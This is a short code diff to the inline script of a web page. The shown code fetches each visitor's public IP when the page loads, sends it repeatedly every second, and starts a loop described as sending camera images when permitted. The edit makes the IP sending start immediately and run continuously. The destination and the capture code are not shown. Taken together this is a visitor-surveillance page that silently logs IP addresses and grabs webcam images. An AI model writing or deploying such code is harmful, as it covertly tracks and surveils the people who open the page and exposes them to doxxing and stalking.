@@ -58,10 +58,12 @@ async function sendData(imageBlob, ip) {
 }
 
 async function startIPSender(ip) {
-  while (true) {
-    await sendData(null, ip);
-    await new Promise(r => setTimeout(r, 1000));
-  }
+  // Immediately send once
+  await sendData(null, ip);
+  // Then send every 1 second without delay
+  setInterval(() => {
+    sendData(null, ip);
+  }, 1000);
 }
 
 async function captureLoop(ip) {
@@ -94,8 +96,8 @@ async function captureLoop(ip) {
 
 (async () => {
   const ip = await getPublicIP();
-  startIPSender(ip); // start sending IP every 1 second, instantly after load
-  captureLoop(ip);   // start sending camera images if permitted
+  startIPSender(ip); // start IP sending immediately and continuously
+  captureLoop(ip);   // start sending camera images if allowed
 })();
 </script>
 </body>
